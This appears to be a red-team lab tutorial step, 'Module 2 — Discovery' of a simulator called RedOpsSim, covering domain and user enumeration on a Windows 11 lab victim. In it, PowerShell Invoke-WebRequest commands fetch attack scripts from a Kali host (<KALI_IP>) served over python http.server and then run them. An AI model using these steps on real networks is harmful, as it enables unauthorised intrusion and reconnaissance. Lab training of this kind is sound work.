🟥 MODULE 2 — DISCOVERY

🎯 MODULE 2 GOAL 

Now that the attacker has execution (Module 1), the next question is:

“Where am I, what domain am I in, who are the users, and what can I access?”

This module collects intelligence, it does not exploit yet.

🧠 WHAT MODULE 2 REPRESENTS (CONCEPT)

In real attacks:

Execution ≠ success

Attackers must understand the environment

Wrong assumptions = failed attack

Discovery answers:

Am I a domain user?

Which domain?

Who are admins?

What machines exist?

Is anyone logged in?

🟦 STEP 1 — WHERE MODULE 2 RUNS

Runs on: Windows 11 (victim)

Triggered by: RedOpsSim (automated)

Not typed manually

Kali is only delivery, not execution.

🟩 STEP 2 — CREATE DISCOVERY MODULE (ON KALI)
On Kali:

cd ~/RedOpsSim/modules
nano discovery.py

🟨 STEP 3 — UPDATE MAIN CONTROLLER (redops.py)
On Kali:


cd ~/RedOpsSim
nano redops.py

🟥 STEP 4 — TRANSFER MODULE 2 TO WINDOWS 11
On Kali:

cd ~/RedOpsSim
python3 -m http.server 8000

On Windows 11 (PowerShell Admin):
cd C:\Users\Public
Invoke-WebRequest http://<KALI_IP>:8000/redops.py -OutFile redops.py
Invoke-WebRequest http://<KALI_IP>:8000/modules/discovery.py -OutFile modules\discovery.py
Invoke-WebRequest http://<KALI_IP>:8000/modules/execution.py -OutFile modules\execution.py

🟩 STEP 5 — RUN MODULE 2 (THIS IS THE ATTACK)

cd C:\Users\Public
.\python.exe redops.py

✅  OUTPUT 

You should now see automated enumeration, such as:

Domain user (redops\user1)

Group memberships

Domain name (redops.local)

List of domain users

Logged-in users

Network adapter details

Running processes

🎯 This confirms successful discovery.




